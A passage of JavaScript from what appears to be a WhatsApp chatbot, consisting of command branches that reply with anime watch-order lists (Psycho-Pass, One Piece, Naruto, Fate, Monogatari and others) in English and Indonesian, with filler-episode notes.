			m.chat,
			{
				text: `*Watch order Psycho Pass ࿐໋*

- Psycho Pass S1
- Psycho Pass S2
- Psycho Pass the Movie
- Psycho Pass: Sinners of the System :
     Psycho-Pass: Sinners of the System Case.1 – Tsumi to Bachi.
     Psycho-Pass: Sinners of the System Case.2 – First Guardian.
     Psycho-Pass: Sinners of the System Case.3 – Onshuu no Kanata ni.
- Psycho Pass: First Inspector
- Psycho Pass S3`,
			},
			{ quoted: m },
		);
	} else if (text === "kara no kyoukai") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Kara no Kyoukai ࿐໋*

- Kara no Kyoukai 2: Satsujin Kousatsu (Zen)
- Kara no Kyoukai 4: Garan no Dou
- Kara no Kyoukai 3: Tsuukaku Zanryuu
- Kara no Kyoukai 1: Fukan Fuukei
- Kara no Kyoukai 5: Mujun Rasen
- Kara no Kyoukai 6: Boukyaku Rokuon
- Kara no Kyoukai 7: Satsujin Kousatsu (Kou)
- Kara no Kyoukai: Shuushou
- Kara no Kyoukai Remix: Gate of Seventh Heaven
- Kara no Kyoukai: Mirai Fukuin
- Kara no Kyoukai: Mirai Fukuin Extra Chorus`,
			},
			{ quoted: m },
		);
	} else if (text === "hitsugi no chaika") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Hitsugi no Chaika ࿐໋*

- Hitsugi no Chaika
- Hitsugi no Chaika: Avenging Battle
- Hitsugi no Chaika: Nerawareta Hitsugi / Yomigaeru Iseki`,
			},
			{ quoted: m },
		);
	} else if (text === "kimetsu no yaiba") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Kimetsu no Yaiba ࿐໋*

- Kimetsu no Yaiba
- Kimetsu no Yaiba: Kyoudai no Kizuna
- Kimetsu no Yaiba Movie: Mugen Ressha-hen
- Kimetsu no Yaiba: Yuukaku-hen

Spin Off : 
- Kimetsu Gakuen: Valentine-hen`,
			},
			{ quoted: m },
		);
	} else if (text === "no game no life") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order No Game No Life ࿐໋*

- No Game No Life
- No Game No Life Specials
- No Game No Life: Zero

Spin Off :
- No Game No Life: Zero - Manner Movie`,
			},
			{ quoted: m },
		);
	} else if (text === "owari no seraph") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Owari no Seraph ࿐໋*

- Owari no Seraph
- Owari no Seraph: Owaranai Seraph
- Owari no Seraph: The Beginning of the End
- Owari no Seraph: Nagoya Kessen-hen
- Owari no Seraph: Kyuuketsuki Shahal
- Owari no Seraph: Nagoya Kessen-hen - Owaranai Seraph - Nagoya Kessen-hen`,
			},
			{ quoted: m },
		);
	} else if (text === "non non biyori") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Non Non Biyori ࿐໋*

- Non Non Biyori
- Non Non Biyori Repeat
- Non Non Biyori Repeat: Hotaru ga Tanoshinda
- Non Non Biyori: Okinawa e Ikukoto ni Natta
- Non Non Biyori: Vacation
- Non Non Biyori Nonstop`,
			},
			{ quoted: m },
		);
	} else if (text === "natsume yuujinchou") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Natsume Yuujinchou ࿐໋*

- Natsume Yuujinchou
- Natsume Yuujinchou: Ishi Okoshi to Ayashiki Raihousha
- Zoku Natsume Yuujinchou
- Natsume Yuujinchou San
- Natsume Yuujinchou Shi
- Natsume Yuujinchou Go
- Natsume Yuujinchou Go Specials
- Natsume Yuujinchou: Itsuka Yuki no Hi ni
- Natsume Yuujinchou: Nyanko-sensei to Hajimete no Otsukai
- Natsume Yuujinchou Roku
- Natsume Yuujinchou Roku Specials
- Natsume Yuujinchou Movie: Utsusemi ni Musubu`,
			},
			{ quoted: m },
		);
	} else if (text === "bungou stray dogs") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Bungou Stray Dogs*

- Bungou Stray Dogs
- Bungou Stray Dogs: Hitori Ayumu
- Bungou Stray Dogs S2
- Bungou stray Dogs: Dead Apple
- Bungou Stray Dogs S3


*Spin Off:*
- Bungou Stray Dogs Wan!`,
			},
			{ quoted: m },
		);
	} else if (text === "kaguya-sama") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Kaguya-sama*

- Kaguya-sama wa Kokurasetai: Tensai-tachi no Renai Zunousen
- Kaguya-sama wa Kokurasetai? Tensai-tachi no Renai Zunousen
- Kaguya-sama wa Kokurasetai: Tensai-tachi no Renai Zunousen OVA
- Kaguya-sama wa Kokurasetai: Tensai-tachi no Renai Zunousen 3`,
			},
			{ quoted: m },
		);
	} else if (text === "himouto umaru-chan") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `- Himouto! Umaru-chan
- Himouto! Umaru-chan OVA
- Himouto! Umaru-chan R

Gak Wajib ditonton :
- Himouto! Umaru-chan'S`,
			},
			{ quoted: m },
		);
	} else if (text === "saiki kusou") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Ururan Nonton Saiki Kusuo ࿐໋*

Menurut tanggal rilis
- Saiki Kusuo no Ψ-nan (ONA)
- Saiki Kusuo no Ψ-nan
- Saiki Kusuo no Ψ-nan 2nd Season
- Saiki Kusuo no Ψ-nan Conclusion
- Saiki Kusuo no Ψ-nan: Shidou-hen`,
			},
			{ quoted: m },
		);
	} else if (text === "one piece") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order One Piece ࿐໋*

*_Full Series:_*
*【 East Blue Saga 】*
- Romance Dawn: Episode 1-3
- Orange Town: Episode 4-8
- Syrup Village: Episode 9-18
*- Movie 1: One Piece: The Movie*
- Baratie: Episode 19-30
- Arlong Park: Episode 31-44
- Loguetown: Episode 45
- Buggy Adventure: Episode 46-47
- Loguetown: Episode 48-53
- Warship Island Arc: Episode 54-61
*- Movie 2: Clockwork Island Adventure*

*【 Arabasta Saga 】*
- Reverse Mountain: Episode 62-63
- Whisky Peak: Episode 64-67
- Diary of Koby-Meppo: Episode 68-69
- Little Garden: Episode 70-77
- Drum Island: Episode 78-91
- Arabasta: Episode 92-130
*- Movie 3: Chopper’s Kingdom on the Island of Strange Animals*
- Post-Arabasta: 131-135
*Movie 8: The Desert Princess and the Pirates: Adventures in Alabasta*

*【 Sky Island Saga 】*
- Goat Island: Episode 136-138
- Ruluka Island: Episode 139-143
- Jaya: Episode 144-152
*- Movie 4: Dead End Adventure*
- Skypiea: Episode 153-195
*- Movie 5: The Cursed Holy Sword*
- G-8: Episodes 196-206
- Long Ring Long Land: Episode 207-219
- Oceans Dream: Episode 220-224
*- Movie 6: Baron Omatsuri and the Secret Island*
Foxy’s Return: Episode 225-228

*【 Water 7 Saga 】*
- Water 7: Episode 229-263
*- Movie 7: Giant Mecha Soldier of Karakuri Castle*
- Enies Lobby: Episode 264-290, 293-302, 304-312
- Boss Luffy Historical Specials: Episode 291-292, 303, 406-407
- Post-Enies Lobby: Episode 313-325

*【 Thriller Bark 】*
- Ice Hunter: Episode 326-335
- Chopper Man Special: Episode 336
*- Movie 9: Episode of Chopper Plus: Bloom in the Winter, Miracle Sakura*
- Thriller Bark: Episode 337-381
- Spa Island: Episode 382-384

*【 Summit War Saga 】*
- Sabaody Archipelago: Episode 385-405
- Amazon Lily: Episodes 408-417
- Straw Hats Separation: Episode 418-421
- Impel Down: Episode 422-425
- A Gold Lion's Ambition: Episode 426-429
*- One Piece Episode 0*
*- Movie 10: One Piece Film: Strong World*
- Impel Down: Episode 430-452
- Straw Hats Separation: Episodes 453-456
- Marineford: Episodes 457-489
- Post-War: Episodes 490-491
- Toriko Crossover: Episode 492
- Post-War: Episode 493-516
*- One Piece 3D2Y: Ace no shi wo Koete! Luffy Nakama Tono Chikai*

*【 Fish-Man Island Saga 】*
- Return to Sabaody: Episode 517-522
- Fish-Man Island: Episode 523-541
- Toriko Crossover: Episode 542
*- Movie 11: One Piece 3D: Straw Hat Chase*
Fish-Man Island: Episode 543-574

*【 Dressrosa Saga 】*
- Z’s Ambition: Episodes 575-578
*- One Piece: Episode of Merry - Mou Hitori no Nakama no Monogatari*
*- One Piece Episode of Luffy: Hand Island Adventure*
*- Movie One Piece Film: Z*
*- One Piece: Adventure of Nebulandia*
- Punk Hazard: Episode 579-589
- Toriko & Dragon Ball Crossover: Episode 590
- Punk Hazard: Episode 591-625
- Caesar Retrieval: Episode 626-628
- Dressrosa: Episode 629-746
*- One Piece: Episode of Sabo - 3 Kyoudai no Kizuna Kiseki no Saikai to Uketsugareru Ishi*

*【 Yonkou Saga 】*
- Silver Mine: Episode 747-750
*- Movie 13: One Piece Film: Gold*
*- One Piece: Heart of Gold*
- Zou: Episode 751-779
- Marine Rookie: Episode 780-782
- Whole Cake Island: Episode 783-877
- Levely: Episode 878-889
- Cidre Guild: Episode 895-896
*- Movie 14: One Piece: Stampede*
- Wano Country 1&2: Episode 890-958
- 20th Anniversary: Episode 907
- Wano Country Act 3: 959-On Going

_*Skipable Filler*_
Episode ini dapat dilewati karena biasanya memiliki sedikit pengaruh pada plot utama dan karakter cerita.

*-* _Warship Island ( 54-61)_ – Ini adalah arc pertama yang tidak didasarkan pada manga, menjadikannya episode filler pertama One Piece.

*-* _Post-Alabasta (131-135)_ – Arc filler ini menyediakan lima episode yang berdiri sendiri yang menggambarkan masa lalu dan tujuan banyak Bajak Laut Topi Jerami. Baik Luffy maupun Robin tidak diberi episode mereka sendiri.

*-* _Goat Island (136-138)_ – Bajak Laut Topi Jerami membantu seorang lelaki tua bernama Zenny di sebuah pulau untuk melarikan diri dari penangkapan oleh marinir sambil bersembunyi dari mereka.

*-* _Ruluka Island (139-143)_ – Going Merry rusak setelah diserang oleh Ape’s Concert. Topi Jerami kemudian dikirim ke Ruluka untuk menambal kapal sebelum bisa melanjutkan perjalan.

*-* _G-8 (196-206)_ – Arc filler ini, dengan 11 episode, adalah yang terpanjang dari seri. Namun, itu dianggap sebagai arc filler terbaik One Piece berkat antagonisnya yang menarik dan menghibur.

*-* _Ocean’s Dream (220-224)_ – Arc ini terinspirasi oleh video game One Piece, “Ocean’s Dream” untuk PlayStation.

*-* _Foxy (225-226)_ – Selama arc ini, kru Topi Jerami harus berurusan dengan bajak laut Foxy sekali lagi.

*-* _Ice Hunter/Lovely Land (326-335)_ – Dalam arc ini, para kru berhadapan dengan kelompok pemburu hadiah yang dikenal sebagai Keluarga Accino di sebuah pulau musim dingin.

*-* _Spa Island (382-384)_ – Ini adalah arc pengisi lain di mana bajak laut Foxy mengambil alih sebagai antagonis.

*-* _Little East Blue (426-429)_ – Arc prolog untuk film One Piece: Strong World. Jika tertarik untuk melihat filmnya, maka tonton ini dulu.

*-* _Z (575-578)_ – Mirip dengan Little East Blue, arc ini memiliki ikatan dengan film One Piece: Z.

*-* _Caesar Retrieval (626-628)_ – Caesar Clown diculik dari Thousand Sunny oleh karakter misterius dengan kemampuan yang tidak biasa.

*-* _Silver Mine (747-750)_ – Kru Topi Jerami berusaha untuk melarikan diri dari Silver Mine, dan arc ini juga berfungsi sebagai pendahuluan untuk One Piece: Gold.

*-* _Marine Rookie (780-782)_ – Dalam arc ini, kelompok Luffy menyusup ke pangkalan laut untuk kedua kalinya.

*-* _Cidre Guild (895-896)_ – Hanya ada dua episode di filler arc ini, yang merupakan yang terpendek di seluruh anime. Selain itu, ini adalah arc khusus yang terhubung ke film One Piece: Stampede.`,
			},
			{ quoted: m },
		);
	} else if (text === "gochuuman wa usagi desu ka") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Gochuumon wa Usagi Desu ka? ࿐໋*

- Gochuumon wa Usagi desu ka?
- Gochuumon wa Usagi desu ka?? Season 2
- Gochuumon wa Usagi desu ka??: Dear My Sister
- Gochuumon wa Usagi desu ka??: Sing For You
- Gochuumon wa Usagi desu ka? Bloom Season 3`,
			},
			{ quoted: m },
		);
	} else if (text === "ao no exorcist") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Ao no Exorcist ࿐໋*

- Ao no Exorcist
- Ao no Exorcist: Ura Ex
- Ao no Exorcist: Kuro no Iede
- Ao no Exorcist Movie
- Ao no Exorcist Movie Special
- Ao no Exorcist: Kyoto Fujouou-hen
- Ao no Exorcist: Kyoto Fujouou-hen OVA

Versi Rekomendasi : 
- Ao no Exorcist
- Ao no Exorcist Movie
- Ao no Exorcist: Kyoto Fujouou-hen`,
			},
			{ quoted: m },
		);
	} else if (text === "mahouka koukou") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Mahouka Koukou ࿐໋*

- Mahouka Koukou no Rettousei: Tsuioku-hen
- Mahouka Koukou no Rettousei
- Mahouka Koukou no Yuutousei (Spin off)
- Mahouka Koukou no Rettousei: Raihousha-hen
- Mahouka Koukou no Rettousei Movie: Hoshi wo Yobu Shoujo
- Mahouka Koukou no Rettousei Zoku-hen (belum rilis)`,
			},
			{ quoted: m },
		);
	} else if (text === "nanatsu no taizai") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Nanatsu No Taizai ࿐໋*

Berdasarkan Alur :
- Nanatsu No Taizai 
- Nanatsu No Taizai: Ban no Bangai-hen
- Nanatsu No Taizai: Imashime no Fukkatsu
- Nanatsu No Taizai Movie: Tenkuu no Torawarebito
- Nanatsu No Taizai: Eiyuu-tachi wa Hashagu
- Nanatsu No Taizai: Kamigami no Gekirin
- Nanatsu No Taizai: Fundo no Shinpan
- Nanatsu No Taizai Movie: Hikari ni Norowareshi Mono-tachi

Berdasarkan Tanggal Rilis :
- Nanatsu No Taizai
- Nanatsu No Taizai; Ban no Bangai-hen
- Nanatsu No Taizai: Seisen no Shirushi
- Nanatsu No Taizai: Imashime no Fukkatsu
- Nanatsu No Taizai Movie: Tenkuu no Torawarebito
- Nanatsu No Taizai: Revival of the Commandments OVA - Heroes Frolic
- Nanatsu No Taizai: Kamigami no Gekirin
- Nanatsu No Taizai: Fundo no Shinpan
- Nanatsu No Taizai Movie: Hikari ni Norowareshi Mono-tachi

Rekomendasi (+) :
- Nanatsu No Taizai
- Nanatsu No Taizai: Imashime no Fukkatsu
- Nanatsu No Taizai Movie: Tenkuu no Torawarebito
- Nanatsu No Taizai: Kamigami no Gekirin
- Nanatsu No Taizai: Fundo no Shinpan
- Nanatsu No Taizai Movie: Hikari ni Norowareshi Mono-tachi`,
			},
			{ quoted: m },
		);
	} else if (text === "naruto shippuuden") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Anime Naruto Shippuuden ࿐໋*

「 Full Series: 」
*【 Naruto Homecoming 】*
- Kazekage Rescue Mission Arc: Episode 1-32
- Naruto: Shippuuden Movie 1
- Tenchi Bridge Reconnaissance Mission Arc: Episode 33-53
- Twelve Guardian Ninja Arc: Episode 54-71 (Filler)
- *Naruto: Shippuuden Movie - Bonds*

*【 Akatsuki Movement 】*
- Akatsuki Suppression Mission Arc: Episode (72-88)
- Three-Tails' Appearance Arc: Episode 89-112 (Filler)
- Itachi Pursuit Mission Arc: Episode 113-118
- Kakashi Gaiden Arc: Episode 119-121
- *Naruto: Shippuuden Movie - Inheritors of the will of fire*
- Tale of Jiraiya the Gallant Arc: Episode 122-133
- Fated Battle Between Brothers Arc: Episode 134-143
- Six-Tails Unleashed Arc: Episode 144-151 (Filler)

*【 Akatsuki Last Steps 】*
- Pain's Assault Part 1 Arc: Episode 152-169
- Naruto: Shippuuden Movie - The Lost Tower
- Pain's Assault Part 2 Arc: Episode 172-175
- The Locus of Konoha Arc: Episode 176-196 (Filler)
- Five Kage Summit Arc: Episode 197-214

*【 Shinobi World War 】*
- Fourth Shinobi World War: Countdown Part 1 Arc: 215-222
- *Naruto: Shippuuden Movie - Blood Prison*
- Paradise Life on Boat Arc: Episode 223-242 (Filler)
- Fourth Shinobi World War: Countdown Part 2 Arc: Episode 243-255
- Fourth Shinobi World War: Confrontation Part 1 Arc: Episode 256-289
- *Naruto: Shippuuden - Road To Ninja*
- Naruto Shippuden Power Arc: Episode 290-295 (Filler)
- Fourth Shinobi World War: Confrontation Part 2 Arc: Episode 296-321

*【 End Of Shinobi World War 】*
- Fourth Shinobi World War: Climax Part 1 Arc: Episode 322-348
- Kakashi's Anbu Arc: The  Shinobi that Lives in the Darkness: Episode 349-361 (Filler)
- Fourth Shinobi World War: Climax Part 2 Arc: Episode 362-377
- Birth of the Ten-Tails' Jinchuriki Part 1 Arc: Episode 378-393
- In Naruto's Footsteps: The Friends Paths Arc: Episode 394-413
- Birth of the Ten-Tails' Jinchuriki Part 2 Arc: Episode 414-431
- Jiraiya Shinobi HandBook: The Tale of Naruto the Hero Arc: Episode 432-450 (Filler)
- Itachi Shinden Book: Light and Darkness Arc: Episode 451-457
- Kaguya Ootsuki Strikes Arc: Episode 458-479

*【The Day of Peace has Arrived】*
- Childhood Arc: Episode 480-483 (Filler)
- Sasuke Shinden: Book of Sunrise Arc: Episode 484-488
- Shikamaru Hidden: A Cloud Drifting in Silent Darkness Arc: Episode 489-493
- *Naruto: Shippuuden - The Last*
- Konoha Hidden: The Perfect Day for a Wedding Arc: Episode 494-500

*Note: Filler diAnime Naruto agak berbeda dengan anime lain, yakni diAnime Naruto sendiri Filler banyak yang ngaruh ke jalan utamanya. Jadi banyak Filler yang saya gabung diArc utama soalnya sayang kalo gadiliat, saya kasih list fillernya kalau kalian emang bener bener anti filler.*

*Filler Episode List: 28, 57-71, 91-111, 144-151, 170-171, 176-196, 223-242, 257-260, 271, 279-281, 284-295, 303-320, 347-361, 376-377, 388-390, 394-413, 416-417, 422-423, 427-450, 464-468, 480-483*`,
			},
			{ quoted: m },
		);
	} else if (text === "dragon ball") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Anime Dragon Ball Seres ࿐໋*
				
「 Berdasarkan Tanggal Rilis: 」
- Dragon Ball: Episode 1-43 (Filler: 30-33)
- *Dragon Ball Movie: The Bloods Rubies*
- Dragon Ball: Episode 44-70 (Filler: 45)
- *Dragon Ball Movie: Sleeping Princess in Devil's Castle*
- Dragon Ball: Episode 71-118 (Filler: 79-83)
- *Dragon Ball Movie: Mystical Adventure*
- Dragon Ball: Episode 119-153 (Filler: 127-132, 149-153)

「 Rekomendasi [No Movie]: 」
- Dragon Ball
- Dragon Ball Z
- Dragon Ball GT
- Dragon Ball Z Kai
- Super Dragon Ball Heroes`,
			},
			{ quoted: m },
		);
	} else if (text === "infinite stratos") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Infinite Stratos ࿐໋*

- IS: Infinite Stratos 
- IS: Infinite Stratos Encore – Koi ni Kogareru Rokujuusou OVA 
- IS: Infinite Stratos 2 
- IS: Infinite Stratos 2 – Hitonatsu no Omoide OVA 
- IS: Infinite Stratos 2 – World Purge-hen OVA 
- IS: Infinite Stratos 2 – Infinite Wedding Special`,
			},
			{ quoted: m },
		);
	} else if (text === "saint seiya") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Saint Seiya ࿐໋*

Watch order dari Alur Cerita:
• Saint Seiya: The Lost Canvas - Meiou Shinwa
• Saint Seiya: The Lost Canvas - Meiou Shinwa 2
• Saint Seiya 
• Saint Seiya: Meiou Hades Juuni Kyuu-hen
• Saint Seiya: Meiou Hades Meikai-hen
• Saint Seiya: Meiou Hades Elysion-hen
• Saint Seiya: Tenkai-hen Josou - Overture
• Saint Seiya Omega

Untuk Movienya ada:
- *Saint Seiya: Shinku no Shounen Densetsu (1988)*
- *Saint Seiya: Jashin Eris (1987)*
- *Saint Seiya: Kamigami no Atsuki Tatakai (1988)*
- *Saint Seiya: Saishuu Seisen no Senshi-tachi (1989)*
- *Saint Seiya: Soul of Gold (2015)*

Alternative/Another/Recap Story:
- Saint Seiya: Legend of Sanctuary
- Knights of the Zodiac: Saint Seiya
- Saint Seiya Recap
- Saint Seiya: Saintia Shou
- Saint Seiya: Meiou Hades Juuni Kyuu-hen 
- Yomigaerishi Gold Saint-tachi no Shinwa
- Saint Seiya: Gold Saints Data File`,
			},
			{ quoted: m },
		);
	} else if (text === "yuru camp") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Yuru Camp△ ࿐໋*

- Yuru Camp△
- Yuru Camp△ Specials
- Heya Camp△
- Yuru Camp△ Season 2
- Yuru Camp△ Season 2 Specials
- Yuru Camp△ Movie`,
			},
			{ quoted: m },
		);
	} else if (text === "yuru yuri") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Ururan Nonton Yuru Yuri ࿐໋*

- Yuru Yuri
- Yuru Yuri ♪♪
- Yuru Yuri Nachuyachumi!
- Yuru Yuri Nachuyachumi!+
- Yuru Yuri San☆Hai!
- Yuru Yuri, (Ten)
- Mini Yuri`,
			},
			{ quoted: m },
		);
	} else if (text === "yuuki yuuna") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Yuuki Yuuna wa Yuusha de Aru ࿐*

Menurut tanggal rilis :
- Yuuki Yuuna wa Yuusha de Aru
- Yuuki Yuuna wa Yuusha de Aru: Washio Sumi no Shou Movie 1 - Tomodachi
- Yuuki Yuuna wa Yuusha de Aru: Washio Sumi no Shou Movie 2 - Tamashii
- Yuuki Yuuna wa Yuusha de Aru: Washio Sumi no Shou Movie 3 - Yakusoku
- Yuuki Yuuna wa Yuusha de Aru: Washio Sumi no Shou
- Yuuki Yuuna wa Yuusha de Aru: Yuusha no Shou
- Yuuki Yuuna wa Yuusha de Aru: Hidamari
- Yuuki Yuuna wa Yuusha de Aru Churutto!
- Yuuki Yuuna wa Yuusha de Aru: Dai Mankai no Shou

Gak wajib ditonton : 
- Yuuki Yuuna wa Yuusha-bu Shozoku
- Yuuki Yuuna wa Yuushabu Shozoku 2
- Yuuki Yuuna wa Yuushabu Shozoku 3`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "fate") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Anime Fate Serie ࿐໋*

*【 Fate Story Timeline 】*
- Fate/Zero
- Fate/stay night 2006
- Fate/stay night : Unlimited Blade Works
- Fate/stay night : Heaven's Feel

*【 Untuk Another Animenya ada 】*
- Fate/Apocrypha
- Fate/Extra Last Encore
- Fate/Grand Order
- Fate/Kaleid Liner Prisma Illya
- Lord el-melloi II
- Fate/Prototype

*【 Spin-off 】*
- Carnival Phantasm
- Emiya-san Chi no kyou no gohan
- Guda guda order
- FGO Manga de Wakaru!
- Onegai Ainzbern Soudanshitsu
- Fate/Zero cafe

*【 Fate Series Full 】*
- Fate/Zero
- Fate/Zero ll
- Fate/Zero: Onegai! Einzbern Soudanshitsu
- Fate/Stay Night (2006)
- Fate/Stay Night TV Reproduction
- Fate/Stay Night: Unlimited Blade Work
- Fate/Stay Night: UBW S2
- Fate/Stay Night: UBW: Sunny Days
- Fate/Stay Night: Heaven Feel: Pressage Flower
- Fate/Stay Night: Heaven Feel: Lost Butterfly
- Fate/Stay Night: Heaven Feel: Spring Song
- Fate/Kaleid liner Prisma Illya
- Fate/Kaleid liner Prisma Illya 2wei!
- Fate/Kaleid liner Prisma Illya 2wei Herz!
- Fate/Kaleid liner Prisma Illya 3rei!!
- *Fate/Kaleid liner Prisma Illya Movie: Sekka no Chikai*
- *Fate/Kaleid liner Prisma Illya Movie: Licht - Namae no Nai Shoujo*
- Fate/Kaleid liner Prisma Illya (Zoku-hen) [TBA]
- Fate/Kaleid liner Prisma Illya Specials
- Fate/Kaleid liner Prisma Illya 2wei! Specials
- Fate/Kaleid liner Prisma Illya: Undoukai de Dance!
- Fate/Kaleid liner Prisma Illya 2wei Herz! Specials
- Fate/Kaleid liner Prisma Illya 3rei!! Specials
- Fate/Kaleid liner Prisma Illya: Prisma Phantasm
- Fate/Kaleid liner Prisma Illya 2wei!: Mahou Shoujo in Onsen Ryokou
- Fate/Kaleid liner Prisma Illya Movie: Sekka no Chikai - Kuro Sakura no Heya
- Fate/Kaleid liner Prisma Illya Movie: Licht - Namae no Nai Shoujo Mini Anime
- Fate/Grand Order: Babylonia Zettai Majuu Sensen 0: Initier Itium
- Fate/First Order
- Fate/Grand Order: Lost Room/Moonlight
- Fate/Grand Order: Shinsei Entaku Ryouiki Camelot 1- Wandering Agateram
- Fate/Grand Order: Shinsei Entaku Ryouiki Camelot 2 - Paladin Agateram
- Fate/Grand Order: Babylonia Zettai Majuu Sensen
- Fate/Grand Order: Zettai Majuu Sensen Babylonia - Initium Iter
- Fate/Grand Order: Shuukyoku Tokuiten - Kani Jikan Shinden Solomon
- Fate/Grand Order: 7 Himuro no Techi
- Manga de Wakeru! Fate/Grand Order
- Fate/Grand Carnival
- Carnival Phantasm
- Fate/Apochrypa
- Fate/Apochrypa Recaps
- Fate/Prototype
- Fate/Extra: Last Encore
- Fate/Extra: Last Encore - Illustrias Tendousetsu
- Fate/Zero Cafe
- Fate/Zero Remix
- Fate/Strange Fake
- Emiya-san Chi no Kyou no  Gohan
- Lord El-Melloi II Sei no Jikenbo: Rail Zeppelin Grace Note`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "toaru") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Toaru Series ࿐໋*

*【 Touru berdasarkan Seriesnya 】*
- Toaru Majutsu no Index
- Toaru Majutsu no Index II
- Toaru Majutsu no Index III
- Toaru Majutsu no Index Movie: Endymion no Kiseki
- Toaru Kagaku no Railgun
- Toaru Kagaku no Railgun II
- Toaru Kagaku no Railgun III
- Toaru Kagaku no Accelerator

*【 Urutan berdasarkan alurnya 】*
- Toaru Kagaku no Railgun
- Toaru Kagaku no Railgun II
- Toaru Kagaku no Railgun III
- Toaru Kagaku no Accelerator
- Toaru Majutsu no Index
- Toaru Majutsu no Index II
- Toaru Majutsu no Index III
- Toaru Majutsu no Index Movie: Endymion no Kiseki`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "overlord") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Overlord ࿐໋*

Watch order overlord berdasarkan storyline :
- Overlord
- Overlord movie 1 : Funisha no Ou (Recap 1)
- Overlord movie 2 : Shikokku no Eiyuu (Recap 2)
- Overlord Ple Ple Pleiades
- Overlord ll
- Overlord Ple Ple Pleiades S2
- Overlord Ple Ple Pleiades: Nazarick Saidai no Kiki
- Overlord lll
- Overlord Ple Ple Pleiades Season 3

Spin Off : 
- Isekai Quartet S1
- Isekai Quartet S2`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "monogatari") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Monogatari ࿐໋*

*【 Berdasarkan tahun Rilis 】*
- Bakemonogatari
- Nisemonogatari
- Nekomonogatari (Kuro)
- Nekomonogatari (Shiro)
- Kabukimonogatari
- Otorimonogatari
- Onimonogatari
- Koimonogatari
- Hanamonogatari
- Tsukimonogatari
- Owarimonogatari
- Koyomimonogatari
- Owarimonogatari Season 2
- Kizumonogatari I
- Kizumonogatari II
- Kizumonogatari III
- Zoku Owarimonogatari

*【 Berdasarkan season 】*
Season Pertama
- Kizumonogatari I
- Kizumonogatari II
- Kizumonogatari III
- Nekomonogatari (Kuro)
- Bakemonogatari
- Nisemonogatari
Season Kedua
- Kabukimonogatari
- Onimonogatari
- Nekomonogatari (Shiro)
- Owarimonogatari
- Otorimonogatari
- Koimonogatari
Season ketiga atau Final Season
- Tsukimonogatari
- Owarimonogatari S2
- Hanamonogatari
- Koyomimonogatari
- Zoku Owarimonogatari

*【 Rekomendasi 】*
- Kizumonogatari I
- Kizumonogatari II
- Kizumonogatari III
- Nekomonogatari (Kuro)
- Bakemonogatari
- Nisemonogatari
- Kabukimonogatari
- Onimonogatari
- Owarimonogatari
- Nekomonogatari (Shiro)
- Otorimonogatari
- Koimonogatari
- Tsukimonogatari
- Koyomimonogatari
- Owarimonogatari S2
- Hanamonogatari
- Zoku Owarimonogatari`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "danmachi") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka ࿐໋*
				
- Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka
- Sword Oratoria (Ga Wajib)
- Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka OVA
- Dungeon ni Deai wo Motomeru no wa Machigatteiru Darou ka Movie: Orion no Ya
- Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka II
- Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka II OVA
- Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka III
- Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka III OVA
- Dungeon ni Deai wo Motomeru no wa Machigatteiru no Darou ka IV`,
			},
			{ quoted: m },
		);
	} else if (args[0]?.toLowerCase() === "oregairu") {
		ToxxicTechInc.sendMessage(
			m.chat,
			{
				text: `*Watch order Yahari Ore no Seishun Love Comedy wa Machigatteiru. ࿐໋*

- Yahari Ore no Seishun Love Comedy wa Machigatteiru.
- Yahari Ore no Seishun Love Comedy wa Machigatteiru.: Kochira Toshite mo Karera Kanojora no Yukusue ni Sachioukaran Koto o Negawazaru o Enai.
- Yahari Ore no Seishun Love Comedy wa Machigatteiru. Zoku
- Yahari Ore no Seishun Love Comedy wa Machigatteiru. Zoku: Kitto, Onna no Ko wa Osatou to Spice to Suteki na Nanika de Dekiteiru
- Yahari Ore no Seishun Love Comedy wa Machigatteiru. Kan
- Yahari Ore no Seishun Love Comedy wa Machigatteiru. Kan OVA`,
			},
